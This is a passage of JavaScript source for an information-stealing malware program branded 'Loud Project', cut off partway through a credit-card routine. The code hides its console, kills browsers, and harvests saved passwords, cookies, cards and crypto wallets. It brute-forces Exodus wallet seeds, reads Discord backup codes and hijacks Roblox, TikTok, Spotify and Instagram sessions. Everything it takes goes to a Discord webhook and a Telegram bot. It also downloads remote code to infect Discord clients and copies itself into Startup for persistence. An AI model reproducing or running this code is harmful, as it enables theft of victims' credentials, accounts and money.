process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = "0";

const fs = require("fs");
const path = require("path");
const { exec, execSync, spawn } = require("child_process");

hideconsole()
const axios = require("axios");
const glob = require("glob");
const buf_replace = require("buffer-replace");
const asar = require("asar");
const os = require("os");
const crypto = require("crypto");
const sqlite3 = require("sqlite3");
const {Dpapi} = require("@primno/dpapi");
const forge = require("node-forge");
const seco = require("seco-file");
const FormData = require("form-data");
const screenshot = require("screenshot-desktop");
const archiver = require("archiver")
const WebSocket = require("ws");

function hideconsole() {
  const randomFileName = `${randomChar(10)}.ps1`;

  const powershellScript = `
  Add-Type -Name Window -Namespace Console -MemberDefinition '
  [DllImport("Kernel32.dll")]
  public static extern IntPtr GetConsoleWindow();

  [DllImport("user32.dll")]
  public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
  '

  $consolePtr = [Console.Window]::GetConsoleWindow()
  # 0 hide
  [Console.Window]::ShowWindow($consolePtr, 0)
  `;

  const tempDir = process.env.TEMP;
  const tempfile = path.join(tempDir, randomFileName);
  fs.writeFileSync(tempfile, powershellScript);

  try {
      execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: 'inherit' });
  } finally {
      fs.unlinkSync(tempfile);
  }
}


let wbk = `%WEBHOOK%`;
let token = "%TELEGRAM_BOTTOKEN%";
let chatId = "%TELEGRAM_CHATID%";
let tlg = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
let discordInject = `https://raw.githubusercontent.com/familigy/sub/main/index.js`;

let cfg = {
  Persist: "%PERSIST?%",
  Persist: "%BLUESCREEN?%",
};
const identifier = `LoudLogs_${randomChar(4)}-${randomChar(4)}-${randomChar(4)}-${randomChar(4)}`;
const rdm = `LoudLogs_${random(10)}`;

let passwordCount = 0;
let cookieCount = 0;
let ccCount = 0;
let autofillCount = 0;
const allPasswords = [];
const cookiesBrowserUsed = new Set();
const passwordsBrowserUsed = new Set();
const cardsBrowserUsed = new Set();
const autofilldataBrowserUsed = new Set();

const appdata = process.env.APPDATA;
const LOCAL = process.env.LOCALAPPDATA;
const gameFiles = [];
const runningDiscords = [];

const paths = [
  appdata + "\\discord\\",
  appdata + "\\discordcanary\\",
  appdata + "\\discordptb\\",
  appdata + "\\discorddevelopment\\",
  appdata + "\\lightcord\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Default\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 1\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 2\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 3\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 4\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 5\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Guest Profile\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Default\\Network\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\",
  LOCAL + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\",
  appdata + "\\Opera Software\\Opera Stable\\",
  appdata + "\\Opera Software\\Opera GX Stable\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 1\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 2\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 3\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 4\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 5\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Guest Profile\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\",
  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\",
  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",
  LOCAL + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\",
];
function deobfuscate(texte) {
  return Buffer.from(texte, "base64").toString();
}

const walletLocalPaths = {
  Bitcoin: path.join(appdata, deobfuscate("Qml0Y29pbg=="), "wallets"),
  Zcash: path.join(appdata, deobfuscate("WmNhc2g=")),
  Armory: path.join(appdata, deobfuscate("QXJtb3J5")),
  Bytecoin: path.join(appdata, deobfuscate("Ynl0ZWNvaW4=")),
  Jaxx: path.join(appdata, deobfuscate("Y29tLmxpYmVydHkuanh4"), deobfuscate("SW5kZXhlZEJEXy9maWxlX18wLmluZGV4ZWQubGV2ZWxkYg=="), deobfuscate("ZmlsZV9fMC5pbmRleGVkZGI=")),
  Exodus: path.join(appdata, deobfuscate("RXhvZHVz"), deobfuscate("ZXhvdXNfd2FsbGV0")),
  Ethereum: path.join(appdata, deobfuscate("RXRoZXJlYXVt"), deobfuscate("a2V5c3RvcmU=")),
  Electrum: path.join(appdata, deobfuscate("RWxlY3RydW0="), deobfuscate("d2FsbGV0cw==")),
  AtomicWallet: path.join(appdata, deobfuscate("YXRvbWlj"), deobfuscate("TG9jYWwgU3RvcmFnZQ"), deobfuscate("bGV2ZWxkYmI=")),
  Guarda: path.join(appdata, deobfuscate("R3VhcmRh"), deobfuscate("TG9jYWwgU3RvcmFnZQ"), deobfuscate("bGV2ZWxkYmI=")),
  Coinomi: path.join(appdata, deobfuscate("Q29pbm9taQ=="), deobfuscate("Q29pbm9taQ=="), deobfuscate("d2FsbGV0cw==")),
};

if (!fs.existsSync(process.env.TEMP + "\\LoudProject")) fs.mkdirSync(process.env.TEMP + "\\LoudProject");
fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`);

(async () => {
  await closeBrowsers();
  await takeCreditcards();
  await takeCheese();
  await takePizzas();
  await takeAutofilldata();
  await saveWallets();
  await getSpotify();
  await takeDigital();
  await getPeperonni();
  await sendTelegram();
  await stealTokens();
  await AllInfos();
  await exodusDecrypt(allPasswords);
  add_to_startup();
})();

function random(length) {
  let result = "";
  const characters = "0123456789";

  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }

  return result;
}

function randomChar(length) {
  let result = "";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }

  return result;
}

function add_to_startup() {
  if (!cfg.Persist) return;
  fs.createReadStream(process.argv0).pipe(fs.createWriteStream(`${process.env.APPDATA.replace("\\", "/")}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`));
}

fs.readdirSync(LOCAL).forEach((file) => {
  if (file.includes("cord")) {
    const pattern = LOCAL + "\\" + file + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";

    glob.sync(pattern).map((fi) => {
      gameFiles.push(fi);

      listDiscord();
    });
  }
});

function listDiscord() {
  exec("tasklist", function (err, stdout, stderr) {
    if (stdout.includes("Discord.exe")) runningDiscords.push("Discord");
    if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("DiscordCanary");
    if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("DiscordPTB");
    if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("DiscordDevelopment");

    killDiscord();
  });
}

function killDiscord() {
  if (!cfg.Persist) return;
  runningDiscords.forEach((disc) => {
    try {
      exec("taskkill /IM " + disc + ".exe /F"),
        (err) => {
          if (err) {
          }
        };
    } catch (e) {}
  });

  Infect();
  pwnBetterDiscord();
}

function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "yandex.exe", "firefox.exe"];

  return new Promise(async (res) => {
    try {
      const tasks = execSync("tasklist");

      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) exec(`taskkill /IM ${process} /F`);
      });

      await new Promise((resolve) => setTimeout(resolve, 2500));

      res();
    } catch {
      res();
    }
  });
}

function startDiscord() {
  runningDiscords.forEach((disc) => {
    try {
      exec(LOCAL + "\\" + disc + "\\Update.exe" + " --processStart " + disc + ".exe", (err) => {
        if (err) {
        }
      });
    } catch {}
  });
}

async function Infect() {
  const response = await axios.get(discordInject).catch(() => null);
  if (!response?.data) return;

  gameFiles.forEach((file) => {
    try {
      fs.writeFileSync(file, response.data, {
        encoding: "utf8",
        flag: "w",
      });
    } catch {}

    startDiscord();
  });
}

function pwnBetterDiscord() {
  const dir = appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
  if (!fs.existsSync(dir)) return;

  const content = fs.readFileSync(dir);
  fs.writeFileSync(dir, buf_replace(content, "api/webhooks", "detectiveloud"));
}

async function saveWallets() {
  for (const [wallet, path] of Object.entries(walletLocalPaths)) {
    if (!fs.existsSync(path)) continue;
    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`);
    await zipResult(path, process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets\\${wallet}.zip`)
  }
}

async function exodusDecrypt(passwords) {
  const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco";
  if (!fs.existsSync(seedpath)) return;
  try {
    let ExodusSaved = path.join(seedpath, "..")
    let zipUrl = await zipResult(ExodusSaved, ExodusSaved + ".zip")
    decryptFileSeco(seedpath, passwords, zipUrl);
  } catch (e){}
}

async function decryptFileSeco(filename, passwords, zipUrl) {
  if (!passwords.length);

  const data = fs.readFileSync(filename);
  let final = "";

  for (const password of passwords) {
    const pass = decryptExodus(data, password);

    if (pass) {
      final = pass;
      break;
    }
  }

  if (!final) return;
  let ExodusURL = await upload(zipUrl) 
  
  axios.post(`${wbk}`, { text: `👀 Loud Project | Exodus Bruteforce\n\n🔑 Password: ${final}` }).catch(() => null);
  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 13172927,
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
          description: `<:bby:987689933844127804> Password:\n\`${final}\`\n\`\`\`${ExodusURL}\`\`\``,
          author: {
            name: "Exodus Bruteforce",
            icon_url: `https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png`,
          },
        },
      ],
    })
    .catch(() => null);
}

function decryptExodus(data, phrase) {
  try {
    seco.decryptData(data, phrase);
    return phrase;
  } catch(e) {
    return "";
  }
}

async function packAsar(inputDir, outputFilePath) {
  try {
    await asar.createPackage(inputDir, outputFilePath);

    if (fs.existsSync(inputDir) && fs.existsSync(outputFilePath)) {
      fs.rmSync(inputDir, {
        recursive: true,
      });
    }
  } catch {}
}

function unpackAsar(asarFilePath, outputDir) {
  try {
    asar.extractAll(asarFilePath, outputDir);
  } catch {}
}

async function screenShot() {
  const img = await screenshot().catch(() => null);
  if (img) fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\screenshot.png`, img);
}

async function sendTelegram() {
  if (!fs.readdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`).length) return;

  const ip = await getIp();

  const cpu = os.cpus()[0].model;
  const ram = os.totalmem();
  const ramingb = (ram / 1024 / 1024 / 1024).toFixed(2);
  const version = os.version();

  axios
    .post(`${tlg}`, {
      text: `🎯 Loud Project | New Victim\n\n💻 Computer: ${
        os.userInfo().username
      }\n🔧 Ram: ${ramingb} GB\n💾 CPU: ${cpu}\n\n🧠 IP: ${ip}\n📡 System Informations: ${version}\n⏲️ Uptime: ${(os.uptime() / 60).toFixed(0)} minutes`,
    })
    .catch(() => null);
}

const tokens = [];

async function AllInfos() {
  if (!fs.readdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`).length) return;

  await screenShot();

  const ip = await getIp();
  let str = "";

  for (let file of fs.readdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`)) {
    if (file === "cookies" || file === "Wallets") {
      const files = fs.readdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\${file}`);
      const size = files.reduce((acc, f) => fs.statSync(process.env.TEMP + `\\LoudProject\\${rdm}\\${file}\\${f}`).size + acc, 0);

      str = `\n🗂️ ${file} - ${formatBytes(size)}` + str;
    } else if (file == "DigitalEntitlements") {
      str += `\n💎 ${file} - ${formatBytes(fs.statSync(process.env.TEMP + `\\LoudProject\\${rdm}\\` + file).size)}`;
    } else {
      str += `\n📄 ${file} - ${formatBytes(fs.statSync(process.env.TEMP + `\\LoudProject\\${rdm}\\` + file).size)}`;
    }
  }

  let path = await zipResult(process.env.TEMP + `\\LoudProject\\${rdm}`, process.env.TEMP + `\\LoudProject\\${rdm}.zip`)
  const linked = await upload(path).catch(() => null);

  const cpu = os.cpus()[0].model;
  const ram = os.totalmem();
  const ramingb = (ram / 1024 / 1024 / 1024).toFixed(2);
  const version = os.version();

  axios
    .post(`${tlg}`, {
      text: `🌎 Loud Project | [Browser Data](${linked})\n\n🔑 Passwords: ${passwordCount} (${Array.from(passwordsBrowserUsed).join(
        ", "
      )})\n🍪 Cookies: ${cookieCount} (${Array.from(cookiesBrowserUsed).join(", ")})\n📋 Autofills: ${autofillCount} (${Array.from(autofilldataBrowserUsed).join(", ")})`,
    })
    .catch(() => null);
  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Passwords",
              value: `\`\`\`${passwordCount}\`\`\``,
              inline: true,
            },
            {
              name: "Cookies",
              value: `\`\`\`${cookieCount}\`\`\``,
              inline: true,
            },
            {
              name: "Credit Cards",
              value: `\`\`\`${ccCount}\`\`\``,
              inline: true,
            },
            {
              name: "Autofills",
              value: `\`\`\`${autofillCount}\`\`\``,
              inline: true,
            },
            {
              name: "Discord Tokens",
              value: `\`\`\`${tokens.length}\`\`\``,
              inline: true,
            },
            {
              name: "Identifier",
              value: `\`\`\`${identifier}\`\`\``,
              inline: true,
            },
            {
              name: "Computer",
              value: `\`\`\`IP Adress : ${ip}\nHostname  : ${os.hostname}\nRAM  : ${ramingb} GB\nCPU  : ${cpu}\nVersion  : ${version}\nUptime  : ${(os.uptime() / 60).toFixed(
                0
              )} minutes\nHome Dir  : ${os.homedir()}\nComputer Name  : ${os.userInfo().username}\`\`\``,
            },
            {
              name: "Browser",
              value: `\`\`\`🍪 Cookies: ${Array.from(cookiesBrowserUsed).length ? Array.from(cookiesBrowserUsed).join(", ") : "Not Found"}\n🔑 Passwords: ${
                Array.from(passwordsBrowserUsed).length ? Array.from(passwordsBrowserUsed).join(", ") : "Not Found"
              }\n💳 Credit cards: ${Array.from(cardsBrowserUsed).length ? Array.from(cardsBrowserUsed).join(", ") : "Not Found"}\n📋 Autofills: ${
                Array.from(autofilldataBrowserUsed).length ? Array.from(autofilldataBrowserUsed).join(", ") : "Not Found"
              }\`\`\``,
              inline: true,
            },
            {
              name: "ZIP File content",
              value: `\`\`\`Zip folder\'s content:\n${str}\`\`\``,
            },
            {
              name: "Download All Informations",
              value: `<:download:917499025282973766> [\`${rdm}.zip\`](${linked})`,
              inline: false,
            },
          ],
          color: 13172927,
          author: {
            name: "Informations",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

async function takeDigital() {
  const path = LOCAL + "\\DigitalEntitlements";
  if (!fs.existsSync(path)) return;

  await zip(path, process.env.TEMP + `\\LoudProject\\${rdm}\\DigitalEntitlements.zip`).catch(() => null);
}

async function getRoblox(secret_cookie) {
  const data = {};
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    cookie: `.ROBLOSECURITY=${secret_cookie.toString()};`,
    origin: "https://www.roblox.com",
    referer: "https://www.roblox.com",
    "sec-ch-ua": "'Chromium';v='110', 'Not A(Brand';v='24', 'Google Chrome';v='110'",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "'Windows'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
  };

  const response = await axios.get("https://www.roblox.com/mobileapi/userinfo", { headers: headers }).catch(() => null);
  if (!response?.data) return data;

  data["id"] = response.data["UserID"];
  data["username"] = response.data["UserName"];
  data["avatar"] = response.data["ThumbnailUrl"];
  data["robux"] = response.data["RobuxBalance"];
  data["premium"] = response.data["IsPremium"];

  return data;
}

async function sendRoblox(secret_cookie) {
  const data = await getRoblox(secret_cookie);
  if (!data.id) return;

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Username",
              value: `\`${data.username || "Unknown"}\``,
              inline: true,
            },
            {
              name: "ID",
              value: `\`${data.id}\``,
              inline: true,
            },
            {
              name: "Robux",
              value: `\`${data.robux || "0"}\``,
              inline: true,
            },
            {
              name: "Premium",
              value: `\`${data.premium ? "✅" : "❌"}\``,
              inline: true,
            },
          ],
          color: 13172927,
          thumbnail: {
            url: `${data.avatar}`,
          },
          author: {
            name: "Roblox Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

const tiktoksCookies = [];

async function getTiktok(secret_cookie) {
  if (tiktoksCookies.includes(secret_cookie)) return;
  tiktoksCookies.push(secret_cookie);

  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, compress, deflate, br",
    cookie: `sessionid=${secret_cookie}`,
  };

  const accountInfo = await axios
    .get(
      "https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE",
      { headers }
    )
    .then((response) => response.data)
    .catch(() => null);
  if (!accountInfo || !accountInfo.data || !accountInfo.data.username) return;

  const insights = await axios
    .post(
      "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
      "type_requests=[{'insigh_type':'vv_history','days':16},{'insigh_type':'pv_history','days':16},{'insigh_type':'like_history','days':16},{'insigh_type':'comment_history','days':16},{'insigh_type':'share_history','days':16},{'insigh_type':'user_info'},{'insigh_type':'follower_num_history','days':17},{'insigh_type':'follower_num'},{'insigh_type':'week_new_videos','days':7},{'insigh_type':'week_incr_video_num'},{'insigh_type':'self_rooms','days':28},{'insigh_type':'user_live_cnt_history','days':58},{'insigh_type':'room_info'}]",
      { headers: { cookie: `sessionid=${secret_cookie}` } }
    )
    .then((response) => response.data)
    .catch(() => null);

  const wallet = await axios
    .get(
      "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
      { headers: { cookie: `sessionid=${secret_cookie}` } }
    )
    .then((response) => response.data)
    .catch(() => null);

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Profile URL",
              value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
              inline: true,
            },
            {
              name: "ID",
              value: `\`${accountInfo.data.user_id_str || "Not available"}\``,
              inline: true,
            },
            {
              name: "Email",
              value: `\`${accountInfo.data.email || "None"}\``,
              inline: true,
            },
            {
              name: "Username",
              value: `\`${accountInfo.data.username || "Username not available"}\``,
              inline: true,
            },
            {
              name: "Followers Count",
              value: `\`${insights?.follower_num?.value || "Not available"}\``,
              inline: true,
            },
            {
              name: "Coins",
              value: `\`${wallet?.data?.coins || "0"}\``,
              inline: true,
            },
            {
              name: "Cookie",
              value: `\`\`\`${secret_cookie || "Not found"}\`\`\``,
            },
          ],
          color: 13172927,
          thumbnail: {
            url: `${accountInfo.data.avatar_url}`,
          },
          author: {
            name: "TikTok Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

async function getSpotify(cookie) {
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    Cookie: `sp_dc=${cookie}`,
  };
  const response = await axios
    .get("https://www.spotify.com/api/account-settings/v1/profile", { headers })
    .then((response) => response.data)
    .catch(() => null);
  if (!response || !response.profile) return;

  const profileData = response.profile;

  const email = profileData.email || "Not available";
  const gender = profileData.gender || "Not available";
  const birthdate = profileData.birthdate || "Not available";
  const country = profileData.country || "Not available";
  const username = profileData.username;

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Profile URL",
              value: username ? `[Click here](https://open.spotify.com/user/${username})` : "Username not available",
              inline: true,
            },
            {
              name: "Username",
              value: `\`${username || "Not available"}\``,
              inline: true,
            },
            {
              name: "Email",
              value: `\`${email}\``,
              inline: true,
            },
            {
              name: "Gender",
              value: `\`${gender}\``,
              inline: true,
            },
            {
              name: "Birthdate",
              value: `\`${birthdate}\``,
              inline: true,
            },
            {
              name: "Country",
              value: `\`${country}\``,
              inline: true,
            },
            {
              name: "Cookie",
              value: `\`\`\`${cookie || "Not found"}\`\`\``,
            },
          ],
          color: 13172927,
          author: {
            name: "Spotify Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

async function instaData(cookie) {
  const data = {};
  const headers = {
    Host: "i.instagram.com",
    "X-Ig-Connection-Type": "WiFi",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Ig-Capabilities": "36r/Fx8=",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "X-Ig-App-Locale": "en",
    "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
    "Accept-Encoding": "gzip, deflate",
    Cookie: `sessionid=${cookie};`,
  };

  const response = await axios
    .get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers })
    .then((response) => response.data)
    .catch(() => null);

  if (response && response.user) {
    data["username"] = response.user.username;
    data["verified"] = response.user.is_verified;
    data["avatar"] = response.user.profile_pic_url;
    data["sessionid"] = cookie;
    data["id"] = response.user.pk_id;
    data["number"] = response.user.phone_number;
    data["mail"] = response.user.email;
    data["name"] = response.user.full_name;
    data["bio"] = response.user.biography;
  }

  const response2 = await axios
    .get(`https://i.instagram.com/api/v1/users/${data["id"]}/info`, { headers: headers })
    .then((response) => response.data)
    .catch(() => null);
  if (response2 && response2.user) {
    data["followers"] = response2.user.follower_count;
    data["follows"] = response2.user.following_count;
  }

  return data;
}

async function getInsta(cookie) {
  const data = await instaData(cookie);

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 3092790,
          fields: [
            {
              name: "Username",
              value: `\`${data.username || "None"}\``,
              inline: true,
            },
            {
              name: "Name",
              value: `\`${data.name || "None"}\``,
              inline: true,
            },
            {
              name: "Email",
              value: `\`${data.mail || "None"}\``,
              inline: true,
            },
            {
              name: "Phone Number",
              value: `\`${data.number || "None"}\``,
              inline: true,
            },
            {
              name: "Follower Count",
              value: `\`${data.followers || 0}\``,
              inline: true,
            },
            {
              name: "Follows Count",
              value: `\`${data.follows || 0}\``,
              inline: true,
            },
            {
              name: "Verifed",
              value: `\`${data.verified ? "✅" : "❌"}\``,
              inline: true,
            },
            {
              name: "Cookie",
              value: `\`\`\`${cookie || "Not found"}\`\`\``,
            },
          ],
          author: {
            name: "Instagram Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
          thumbnail: {
            url: data.avatar,
          },
        },
      ],
    })
    .catch(() => null);
}

async function getPeperonni() {
  const homeDir = os.homedir();
  let str = "";

  if (fs.existsSync(`${homeDir}\\Downloads`)) {
    fs.readdirSync(`${homeDir}\\Downloads`).forEach((file) => {
      if (file.endsWith(".txt") && file.includes("discord_backup_codes")) {
        let path = `${homeDir}\\Downloads\\${file}`;

        str += "\n\nBACKUP CODES FROM: " + path + "  #LoudProject";
        str += `\n\n${fs.readFileSync(path).toString()}`;
      }
    });
  }
  if (fs.existsSync(`${homeDir}\\Desktop`)) {
    fs.readdirSync(`${homeDir}\\Desktop`).forEach((file) => {
      if (file.endsWith(".txt") && file.includes("discord_backup_codes")) {
        let path = `${homeDir}\\Desktop\\${file}`;

        str += "\n\nBACKUP CODES FROM: " + path + "  #LoudProject";
        str += `\n\n${fs.readFileSync(path).toString()}`;
      }
    });
  }
  if (fs.existsSync(`${homeDir}\\Documents`)) {
    fs.readdirSync(`${homeDir}\\Documents`).forEach((file) => {
      if (file.endsWith(".txt") && file.includes("discord_backup_codes")) {
        let path = `${homeDir}\\Documents\\${file}`;

        str += "\n\nBACKUP CODES FROM: " + path + "  #LoudProject";
        str += `\n\n${fs.readFileSync(path).toString()}`;
      }
    });
  }

  if (str) fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\backup_codes.txt`, str.slice(2));
}

async function getCreditcards(path) {
  const path_split = path.split("\\");
